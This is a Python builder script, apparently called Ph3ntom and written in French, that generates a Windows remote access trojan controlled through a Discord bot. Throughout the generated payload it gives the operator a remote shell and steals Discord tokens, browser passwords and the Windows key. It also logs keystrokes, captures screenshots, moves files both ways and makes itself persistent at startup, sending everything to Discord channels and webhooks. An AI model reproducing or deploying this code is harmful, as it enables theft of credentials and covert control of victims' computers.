# -*- coding: utf-8 -*-

from colorama import Fore, init
from os import system, name

if name == "nt":
    try:
        system("title Ph3ntom")
        system("mode 160, 40")
    except:
        pass

init()

print(Fore.MAGENTA+"""\n\n
                                                ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓
                                                ▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒
                                                ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░
                                                ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██ 
                                                ▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒
                                                ▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░
                                                ░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░
                                                ░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░   
                                                        ░  ░  ░      ░  ░         ░              ░ ░         ░""")
print(Fore.RED+ """
                                                             par billythegoat356 | by billythegoat356\n\n\n""")


token = input(Fore.GREEN + "Entrez le token du bot Discord > ")
id = input(Fore.GREEN + "Entrez votre ID d'utilisateur Discord > ")
try:
    id = int(id)
except:
    input(Fore.RED + "Erreur. L'ID doit être un integer.")
    quit()

channel = input(Fore.GREEN + "Entrez l'ID du salon Discord dans lequel vous voulez recevoir le message lorsque la victime éxécute le fichier > ")
try:
    channel = int(channel)
except:
    input(Fore.RED + "Erreur. L'ID du salon doit être un integer.")
    quit()

startup = input(Fore.BLUE + "Voulez-vous déplacer le fichier au démarrage du pc? [y/n] ")
if startup == 'y':
    startup = True
elif startup == 'n':
    startup = False
else:
    input(Fore.RED + "Erreur. La réponse doit être [y/n].")
    quit()



phantom = r'''# -*- coding: utf-8 -*-
import os
if os.name != 'nt':
    exit()
import discord
from discord.ext import commands
from colorama import Fore, init
from subprocess import check_output
from time import sleep
import pyautogui
import os, os.path
from anonfile import AnonFile
from sys import getsizeof
from requests import *
from json import dumps
from dhooks import *
from threading import Thread
import json
from shutil import move
from re import findall
from os import listdir, getenv, name
from json import loads, dumps
from urllib.request import urlopen, Request
from re import findall
from base64 import b64decode
from sys import argv
from os.path import exists
from urllib.request import Request, urlopen
from json import loads, dumps
from base64 import b64decode
from sys import argv
from datetime import datetime
from requests import post, delete
from colorama import Fore
import discord
import sys, os, re, json, ctypes, shutil, base64, sqlite3, zipfile, subprocess
from re import findall
from requests import get
from shutil import move
from os import getenv, listdir, system
import subprocess
from json import loads, dumps
from urllib.request import urlopen, Request
from re import findall
from subprocess import PIPE
from base64 import b64decode
from sys import argv
from os.path import exists, split
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESCCM
from cryptography.hazmat.backends import default_backend
from requests import get
import discord
from urllib.request import Request, urlopen
from json import loads, dumps
from base64 import b64decode
from sys import argv
from os.path import split
from threading import Thread
from random import choice
from time import sleep
import ctypes
import ctypes.wintypes
import subprocess
from pynput import keyboard
from os import remove, getenv
from os.path import isfile
from threading import Thread
from time import sleep

"""
VAR
"""

init()

anon = AnonFile(token="f83f9c732731906c")


id = '''+ str(id) + r'''
channel_id = '''+ str(channel) + r'''
token = "'''+ token + r'''"
startup = ''' + str(startup) + r'''

nom_fichier =__file__.split("\\")[-1]


phantom = commands.Bot(command_prefix="Ph4ntom", intents=discord.Intents.all())

save = f"C:/ProgramData/screen.png"

pc_name = getenv("username")
startup_path = fr"C:\Users\{pc_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

shell = False
keylog = False
screen = False



headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}


"""
FONCTIONS
"""

async def get_token(lien):
    # -*- coding: utf-8 -*-



    liste = []

    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072


    languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'it'    : 'Italy',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
    }



    if name != 'nt':
        quit()


    def getheaders(token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    liste = []

    LOCAL = getenv("LOCALAPPDATA")
    ROAMING = getenv("APPDATA")
    PATHS = {
        "Discord"           : ROAMING + "\\Discord",
        "Discord Canary"    : ROAMING + "\\discordcanary",
        "Discord PTB"       : ROAMING + "\\discordptb",
        "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
        "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    def getuserdata(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
        except:
            pass
    def gettokens(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    def getip():
        ip = org = loc = city = country = region = googlemap = "None"
        try:
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            data = json.load(response)
            ip = data['ip']
            org = data['org']
            loc = data['loc']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        except:
            pass
        return ip,org,loc,city,country,region,googlemap
    def getavatar(uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]
        return url
    def has_payment_methods(token):
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
        except:
            pass
    try:
        cache_path = ROAMING + "\\.cache~$"
        self_spread = True
        working = []
        checked = []
        already_cached_tokens = []
        ip,org,loc,city,country,region,googlemap = getip()
        working_ids = []
        pc_username = getenv("UserName")
        pc_name = getenv("COMPUTERNAME")
        for platform, path in PATHS.items():
            if not exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                embeds = []
                badge = ""
                liste.append(token)
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                avatar_id = user_data["avatar"]
                avatar_url = getavatar(user_id, avatar_id)
                email = user_data.get("email")
                phone = user_data.get("phone")
                locale = user_data['locale']
                mfa_enabled = bool(user_data['mfa_enabled'])
                verified = bool(user_data['verified'])
                creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                billing = bool(has_payment_methods(token))
                nitro = bool(user_data.get("premium_type"))
                badges = user_data.get("public_flags")
                boost = bool(user_data.get("purchased_flags"))
                if locale in languages:
                        locale = languages[locale]
                try:
                    if type(badges) == list:
                        for element in badges:
                            if element == Discord_Employee:
                                badge += "<:staff:842474086814973962> "
                            if element == Partnered_Server_Owner:
                                badge += "<:partner:842474129839226930>"
                            if element == HypeSquad_Events:
                                badge += "<:hypesquad:842474171669545000>"
                            if element == Bug_Hunter_Level_1:
                                badge += "<:bug_hunter:842474228414808064>"
                            if element == Bug_Hunter_Level_2:
                                badge += "<:bug_hunter_level_2:842474958533951508>"
                            if element == House_Bravery:
                                badge += "<:hypesquad_bravery:842474410501079081>"
                            if element == House_Brilliance:
                                badge += "<:hypesquad_brilliance:842474552167497748>"  
                            if element == House_Balance:
                                badge += "<:hypesquad_balance:842474618455588885>"
                            if element == Early_Verified_Bot_Developer:
                                badge += "<:verified_bot_developer:842475119763128371>"

                    elif type(badges) == int:
                        if nitro == True:
                            badge += "<:nitro:842517121283391489>"
                        if boost == True:
                            badge += "<:boost:842517154921709579>"
                        if badges == Discord_Employee:
                            badge += "<:staff:842474086814973962> "
                        if badges == Partnered_Server_Owner:
                            badge += "<:partner:842474129839226930>"
                        if badges == HypeSquad_Events:
                            badge += "<:hypesquad:842474171669545000>"
                        if badges == Bug_Hunter_Level_1:
                            badge += "<:bug_hunter:842474228414808064>"
                        if badges == Bug_Hunter_Level_2:
                            badge += "<:bug_hunter_level_2:842474958533951508>"
                        if badges == House_Bravery:
                            badge += "<:hypesquad_bravery:842474410501079081>"
                        if badges == House_Brilliance:
                            badge += "<:hypesquad_brilliance:842474552167497748>"  
                        if badges == House_Balance:
                            badge += "<:hypesquad_balance:842474618455588885>"
                        if badges == Early_Verified_Bot_Developer:
                            badge += "<:verified_bot_developer:842475119763128371>"
                        

                    if badge == "":
                        badge = "<:false:743900483734864016>"
                    if phone == None:
                        phone = "<:false:743900483734864016>"
                    if billing == False:
                        billing = "<:false:743900483734864016>"
                    if billing == True:
                        billing = "<:true:842512519082934283>"
                    if nitro == False:
                        nitro = "<:false:743900483734864016>"
                    if nitro == True:
                        nitro = "<:nitro:842517121283391489>"
                    if boost == False:
                        boost = "<:false:743900483734864016>"
                    if boost == True:
                        boost = "<:boost:842517154921709579>"
                    if mfa_enabled == False:
                        mfa_enabled = "<:false:743900483734864016>"
                    if mfa_enabled == True:
                        mfa_enabled = "<:true:842512519082934283>"
                    if verified == False:
                        verified = "<:false:743900483734864016>"
                    if verified == True:
                        verified = "<:true:842512519082934283>"
                except:
                    pass
                embed = {
                    "color": 0xd15943,
                    "fields": [
                        {
                            "name": "**Infos Du Compte**",
                            "value": f'Email: {email}\nTel enregistré: {phone}\nCarte Bancaire: {billing}',
                            "inline": True
                        },
                        {
                            "name": "**Infos du PC**",
                            "value": f'Nom de la machine: {pc_username}\nNom du PC: {pc_name}\nToken: {platform}',
                            "inline": True
                        },
                        {
                            "name" : "**Badges**",
                            "value": f'Badges : {badge}\nNitro: {nitro}\nBoost : {boost}',
                            "inline": True
                        },
                        {
                            "name": "**Géolocalisation**",
                            "value":f'IP: {ip} \nGéolocalisation: [{loc}]({googlemap}) \nVille: {city} \nRégion: {region}',
                            "inline": True
                        },
                        {
                            "name" : "**Infos Supplémentaires**",
                            "value": f'Localisation: {locale}\nEmail Vérifié: {verified}\n2FA Activée: {mfa_enabled}\nCreation Date: {creation_date}',
                            "inline": True
                        },
                        {
                            "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    },
                    "footer": {
                        "text": f"Ph4ntom"
                    }
                }
                embeds.append(embed)
                with open(cache_path, "a") as file:
                    for token in checked:
                        if not token in already_cached_tokens:
                            file.write(token + "\n")
                if len(working) == 0:
                    working.append('123')

                webhook = {"embeds":embeds}

                post(lien.url, data=json.dumps(webhook).encode("utf-8"), headers=getheaders(token))
                


    except Exception as e:
        print(e)

    delete(lien.url)


async def passwords(channel):


    try:
        ip = get("https://billy.loca.lt/api/v1/ipv4").text
    except:
        ip = "error"

    APP_DATA_PATH = os.environ['LOCALAPPDATA']
    DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
    NONCE_BYTE_SIZE = 12

    def encrypt(cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)


    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)


    def rcipher(key):
        cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
        return cipher


    def dpapi(encrypted):

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result


    def localdata():
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]


    def decryptions(encrypted_txt):
        encoded_key = localdata()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = dpapi(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = rcipher(key)
        return decrypt(cipher, encrypted_txt[15:], nonce)


    class chromepassword:
        def __init__(self):
            self.passwordList = []


        def chromedb(self):
            _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
            _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
            if os.path.exists(_temp_path):
                os.remove(_temp_path)
            shutil.copyfile(_full_path, _temp_path)
            self.pwsd(_temp_path)

        def pwsd(self, db_file):
            conn = sqlite3.connect(db_file)
            _sql = 'select signon_realm,username_value,password_value from logins'
            for row in conn.execute(_sql):
                host = row[0]
                if host.startswith('android'):
                    continue
                name = row[1]
                value = self.cdecrypt(row[2])
                _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
                self.passwordList.append(_info)
            conn.close()
            os.remove(db_file)


        def cdecrypt(self, encrypted_txt):
            if sys.platform == 'win32':
                try:
                    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                        decrypted_txt = dpapi(encrypted_txt)
                        return decrypted_txt.decode()
                    elif encrypted_txt[:3] == b'v10':
                        decrypted_txt = decryptions(encrypted_txt)
                        return decrypted_txt[:-16].decode()
                except WindowsError:
                    return None
            else:
                pass


        def saved(self):
            with open(rf'C:\ProgramData\{ip}_passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)


    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()



    # PASSWORDS > .ZIP :
    zname = rf'C:\ProgramData\{ip}_passwords.zip'
    newzip = zipfile.ZipFile(zname, 'w')
    newzip.write(rf'C:\ProgramData\{ip}_passwords.txt')
    newzip.close()
    passwords = discord.File(rf'C:\ProgramData\{ip}_passwords.zip')


    # SEND INFORMATION > REMOVE EVIDENCE :
    await channel.send(file=passwords)
    os.remove(rf'C:\ProgramData\{ip}_passwords.zip')
    os.remove(rf'C:\ProgramData\{ip}_passwords.txt')


    # GOOGLE CHROME | CREDIT-CARDS :
    def master():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except:
            pass
        try:
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = ctypes.windll.crypt32.CryptUnprotectData(
                (master_key, None, None, None, 0)[1])
            return master_key
        except:
            pass


    def dpayload(cipher, payload):
        return cipher.decrypt(payload)


    def gcipher(aes_key, iv):
        return algorithms.AES.new(aes_key, AESCCM.MODE_GCM, iv)


    def dpassword(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = gcipher(master_key, iv)
            decrypted_pass = dpayload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            pass


    # MICROSOFT EDGE | PASSWORD & CREDIT-CARDS :
    def passwordsteal():
        master_key = master()
        login_db = os.environ['USERPROFILE'] + os.sep + \
            r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
        try:
            shutil.copy2(login_db, "C:/ProgramData/Loginvault.db")
        except:
            pass
        conn = sqlite3.connect("C:/ProgramData/Loginvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = dpassword(
                    encrypted_password, master_key)
        except:
            pass

        cursor.close()
        conn.close()


    passwordsteal()


    try:
        subprocess.os.system('del C:/ProgramData/Loginvault.db')
    except:
        pass


def keylogger(lien, temps):




    wbh = lien.url
    lien = Webhook(lien.url)

    keys = {}

    fichier = f"C:/ProgramData/keys.txt"

    if isfile(fichier):
        try:
            remove(fichier)
        except:
            pass

    def envoi_fichier():
        while True:
            if keylog == False:
                delete(wbh)
                return

            if isfile(fichier):
                fichier_send = File(fichier)
                sleep(temps)
                lien.send(file=fichier_send)
                try:
                    remove(fichier)
                except:
                    pass





    for i in range(11):
        keys["<" + str(i + 96) + ">"] = str(i)


    def on_press(key):

        if keylog == False:
            return

        key = str(key)

        if key in keys:
            key = keys[key]

        if key[0] == "'" and key[2] == "'":
            key = key[1]
        
        if key == "Key.ctrl_l":
            key = "ctrl"

        if key == "Key.caps_lock":
            key = "maj_lock"
        
        if key == "Key.shift":
            key = "shift"

        if key == "Key.enter":
            key = "enter"

        if key == "Key.space":
            key = "space"

        if key == "Key.backspace":
            key = "delete"

        if key == str(r"'\x03'"):
            key = "ctrl_c"
        
        if key == str(r"'\x16'"):
            key = "ctrl_v"

        if key == str(r"'\x13'"):
            key = "ctrl_s"

        if key == str(r"'\x06'"):
            key = "ctrl_f"

        if key == str(r"'\x08'"):
            key = "ctrl_h"

        with open(fichier, 'a') as f:
            f.write(key + "\n")
            f.close()
        
    Thread(target=envoi_fichier).start()


    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()







async def windows_key(channel):


    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output(
            'wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output(
            'wmic os get Caption').decode().split('\n')[1].strip()

        if keys == '':
            keys = 'unavailable'
        else:
            pass

        try:
            ip = get("https://billy.loca.lt/api/v1/ipv4").text

        except:
            ip = "error"

        embed = discord.Embed(
            title=f'{ip}_key :',
            description=f'user : {usr}\ntype : {types}\nkey : {keys}\nPh3ntom',
            color=0x2f3136
        )
        await channel.send(embed=embed)

    except Exception as e:
        print(e)















@phantom.event
async def on_ready():
    chan = phantom.get_channel(channel_id)
    if isfile(startup_path + nom_fichier):
        await chan.send("Nouvelle éxécution du fichier...")
        quit()
    await chan.send(content="Infecté.")
    if startup:
        try:
            move(__file__, startup_path)
            await chan.send(content="Fichier déplacé au démarrage du pc.")
        except:
            await chan.send(content="Erreur lors du déplacement du fichier au démarrage du pc.")



@phantom.listen()
async def on_message(mess):
    global save

    """
    VAR
    """


    global shell
    global keylog
    
    full = ""


    content = mess.content
    content_list = content.split(" ")
    channel = mess.channel
    author = mess.author
    guild = mess.guild

    for a in content_list:
        full += a + " "


    """
    EXCLUSIONS
    """


    if author.bot == True:
        return

    if author.id != id:
        return


    """
    COMMANDS
    """




    if content == "-shell":

        try:

            if shell != False:
                try:
                    chan = guild.get_channel(shell.id)
                    await chan.delete()
                    if channel.id != shell.id:
                        await channel.send(content="Le salon permettant de contrôler le shell de la victime à été supprimé.")
                except:
                    if channel.id != shell.id:
                        await channel.send(content="ERROR")
                shell = False

                return


            shell = await guild.create_text_channel(name="shell")
            await shell.send(content="Entrez une commande pour l'éxécuter dans le shell de la victime. Entrez -shell pour arrêter ce mode.")
        

            await channel.send(content="Le salon permettant de contrôler le shell de la victime à été crée.")

        except:

            await channel.send(content="ERROR")

        return


    if shell != False:

        if channel.id == shell.id:

            try:

                try:
                    output = check_output(full, shell=True).decode("cp850")
                    if output == "":
                        output = "OK"
                except:
                    output = "ERREUR"
                
                if len(output) >= 2000:
                    output = "TROP LONG"
                await channel.send(content=output)
                return
            
            except:

                await channel.send(content="ERROR")

            return

    if content_list[0] == "-keylogger":

        if keylog == False:


            lien = await channel.create_webhook(name="Ph4ntom")

            

            if len(content_list) == 2:
                try:
                    delai = int(content_list[1])
                except:
                    await channel.send(content="ERROR. Merci de spécifier un délai en integer.")
                    return
            else:
                delai = 15

            if delai < 7:
                await channel.send(content="ERROR. Merci de spécifier un délai supérieur ou égal à 8.")
                return

            Thread(target=keylogger, args=(lien, delai)).start()

            keylog = True

            await channel.send(f"Le keylogger à été activé. Le délai entre les envois à été défini sur {delai} secondes.")

        elif keylog == True == len(content) == 1:

            keylog = False

            await channel.send("Le keylogger à été désactivé.")




    if content == "-help":
        embed = discord.Embed(title="Ph4ntom", url="https://github.com/billythegoat356/Ph4ntom", description="Prefix : [-]")
        embed.set_footer(text="Ph4ntom | billythegoat356")
        embed.add_field(name="-shell", value="Créer un salon permettant de contôler le shell de la victime. Refaire la commande pour supprimer le salon.", inline=False)
        embed.add_field(name="-token", value="Récupérer le token discord de la victime.", inline=False)
        embed.add_field(name="-pass", value="Récupérer les passwords de la victime.", inline=False)
        embed.add_field(name="-key", value="Récupérer la clé windows de la victime.", inline=False)
        embed.add_field(name="-info", value="Récupérer quelques informations sur le pc de la victime.", inline=False)
        embed.add_field(name="-get <fichier>", value="Récupérer un fichier sur le pc de la victime. La taille du fichier doit être inférieure de 5MB.", inline=False)
        embed.add_field(name="-save <fichier>", value="Télécharger un fichier sur le pc de la victime. Les arguments doivent être la path où le fichier doit être téléchargé, et le fichier en attachement. La taille du fichier doit être inférieure de 5MB.", inline=False)
        embed.add_field(name="-screen", value="Récupérer une capture d'écran du pc de la victime. La taille du fichier doit être inférieure de 5MB.", inline=False)
        await channel.send(embed=embed)


    if content == "-token":

        try:

            lien = await channel.create_webhook(name="Ph4ntom")

            phantom.loop.create_task(get_token(lien))

        except:

            await channel.send(content="ERROR")



    if content == "-passwords":

        try:

            phantom.loop.create_task(passwords(channel))
        
        except:

            await channel.send(content="ERROR")


    if content == "-key":

        try:

            phantom.loop.create_task(windows_key(channel))

        
        except:

            await channel.send(content="ERROR")



    if content == "-info":

        try:

            user = os.getenv("username")
            try: 
                ip = get("https://billy.loca.lt/api/v1/ipv4").text
            except:
                ip = "error"
            embed = discord.Embed(title="Ph4ntom", url="https://github.com/billythegoat356/Ph4ntom", description="Prefix : [-]")
            embed.set_footer(text="Ph4ntom | billythegoat356")
            embed.add_field(name="User:", value=user, inline=False)
            embed.add_field(name="IP:", value=ip, inline=False)
            embed.add_field(name="Fichier:", value=__file__, inline=False)
            await channel.send(embed=embed)

        except:

            await channel.send(content="ERROR")



    if content_list[0] == "-get" and len(content_list) == 2:

        try:

            if os.path.isfile(content_list[1]):
                if getsizeof(content_list[1]) > 5000000:
                    await channel.send(content="Le fichier est trop gros (taille supérieure à 5MB) :/")
                    return

                else:
                    await channel.send(file=discord.File(content_list[1]))
            else:
                await channel.send(content="Le fichier précisé n'existe pas.")

        except:

            await channel.send(content="ERROR")



    if content_list[0] == "-save" and len(content_list) == 2 and len(mess.attachments) == 1:
        
        try:

            fichier = mess.attachments[0]
            if getsizeof(fichier) > 5000000:
                await channel.send(content="Le fichier est trop gros (taille supérieure à 5MB) :/")
                return
            await fichier.save(content_list[1])
            await channel.send(content="C'est fait :)")
                    
        except:

            await channel.send(content="ERROR")
        


    if content_list[0] == "-screen" and len(content_list) == 1:

        try:

            if len(content_list) == 1:

                screen = pyautogui.screenshot()

                screen.save(save)

                if getsizeof(save) > 5000000:
                    await channel.send(content="Le fichier est trop gros (taille supérieure à 5MB) :/")
                    return

                await channel.send(file=discord.File(save))

                os.remove(save)

        except:

            await channel.send(content="ERROR")

phantom.run(token)'''

try:
    with open("phantom.pyw", 'w', encoding='utf-8') as f:
        f.write(phantom)
    input(Fore.MAGENTA + "\n\nLe fichier à été crée dans votre répertoire actuel.")
except:
    input(Fore.RED + "\n\nErreur. Le fichier n'a pas pu être crée.")